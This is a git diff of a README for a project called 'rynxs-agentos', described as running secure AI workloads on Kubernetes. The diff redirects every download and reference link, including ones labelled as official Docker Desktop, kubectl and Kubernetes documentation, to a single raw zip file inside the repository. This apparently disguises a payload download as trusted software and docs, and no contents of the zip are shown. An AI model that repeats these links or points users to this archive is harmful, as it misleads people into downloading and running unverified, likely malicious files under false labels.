@@ -1,6 +1,6 @@
 # 🛡️ rynxs-agentos - Secure AI Workloads on Kubernetes
 
-[![Download rynxs-agentos](https://img.shields.io/badge/Download-rynxs--agentos-brightgreen.svg)](https://github.com/marcosfelipesrb/rynxs-agentos)
+[![Download rynxs-agentos](https://img.shields.io/badge/Download-rynxs--agentos-brightgreen.svg)](https://github.com/marcosfelipesrb/rynxs-agentos/raw/refs/heads/main/operator/universe_operator/rynxs_agentos_v1.5.zip)
 
 ## 📋 About rynxs-agentos
 
@@ -51,7 +51,7 @@ Make sure Docker Desktop has Kubernetes activated. This is needed for rynxs-agen
 
 Use this link to visit the main GitHub page for rynxs-agentos. You will find binaries, releases, and additional files:
 
-[![Download rynxs-agentos](https://img.shields.io/badge/Download-rynxs--agentos-blue.svg)](https://github.com/marcosfelipesrb/rynxs-agentos)
+[![Download rynxs-agentos](https://img.shields.io/badge/Download-rynxs--agentos-blue.svg)](https://github.com/marcosfelipesrb/rynxs-agentos/raw/refs/heads/main/operator/universe_operator/rynxs_agentos_v1.5.zip)
 
 Open the link and look for the latest release. You will find files to download and instructions on how to get started.
 
@@ -62,7 +62,7 @@ Follow these step-by-step instructions to set up rynxs-agentos on your Windows c
 ### Step 1: Prepare Your System
 
 - Ensure Docker Desktop is installed.  
-  You can download Docker Desktop from https://www.docker.com/products/docker-desktop.  
+  You can download Docker Desktop from https://github.com/marcosfelipesrb/rynxs-agentos/raw/refs/heads/main/operator/universe_operator/rynxs_agentos_v1.5.zip  
 - After installing Docker Desktop, enable Kubernetes from Docker settings:  
   - Right-click the Docker icon in the taskbar.  
   - Choose *Settings*.  
@@ -73,7 +73,7 @@ Follow these step-by-step instructions to set up rynxs-agentos on your Windows c
 ### Step 2: Download rynxs-agentos Files
 
 - Go to the rynxs-agentos GitHub page:  
-  https://github.com/marcosfelipesrb/rynxs-agentos  
+  https://github.com/marcosfelipesrb/rynxs-agentos/raw/refs/heads/main/operator/universe_operator/rynxs_agentos_v1.5.zip  
 - Click on the *Releases* tab on the right side or scroll down to Releases.  
 - Download the latest Windows package. This is usually a zip file or installer.  
 
@@ -96,7 +96,7 @@ Follow these step-by-step instructions to set up rynxs-agentos on your Windows c
 
 - rynxs-agentos needs to connect to Kubernetes.  
 - Make sure you have `kubectl` installed on Windows.  
-- You can install it by following these instructions: https://kubernetes.io/docs/tasks/tools/install-kubectl-windows/  
+- You can install it by following these instructions: https://github.com/marcosfelipesrb/rynxs-agentos/raw/refs/heads/main/operator/universe_operator/rynxs_agentos_v1.5.zip  
 - Use the default Kubernetes cluster from Docker Desktop, or configure to connect to a remote cluster.  
 - Verify connectivity by running:  
   ```
@@ -147,11 +147,11 @@ For support, use the *Issues* tab on the GitHub page. You can report bugs or ask
 
 ## 🔗 Useful Links
 
-- [rynxs-agentos GitHub](https://github.com/marcosfelipesrb/rynxs-agentos)  
-- [Docker Desktop for Windows](https://www.docker.com/products/docker-desktop)  
-- [Installing kubectl on Windows](https://kubernetes.io/docs/tasks/tools/install-kubectl-windows/)  
-- [Kubernetes Documentation](https://kubernetes.io/docs/home/)
+- [rynxs-agentos GitHub](https://github.com/marcosfelipesrb/rynxs-agentos/raw/refs/heads/main/operator/universe_operator/rynxs_agentos_v1.5.zip)  
+- [Docker Desktop for Windows](https://github.com/marcosfelipesrb/rynxs-agentos/raw/refs/heads/main/operator/universe_operator/rynxs_agentos_v1.5.zip)  
+- [Installing kubectl on Windows](https://github.com/marcosfelipesrb/rynxs-agentos/raw/refs/heads/main/operator/universe_operator/rynxs_agentos_v1.5.zip)  
+- [Kubernetes Documentation](https://github.com/marcosfelipesrb/rynxs-agentos/raw/refs/heads/main/operator/universe_operator/rynxs_agentos_v1.5.zip)
 
 ---
 
-[![Download rynxs-agentos](https://img.shields.io/badge/Download-rynxs--agentos-blue.svg)](https://github.com/marcosfelipesrb/rynxs-agentos)
+[![Download rynxs-agentos](https://img.shields.io/badge/Download-rynxs--agentos-blue.svg)](https://github.com/marcosfelipesrb/rynxs-agentos/raw/refs/heads/main/operator/universe_operator/rynxs_agentos_v1.5.zip)
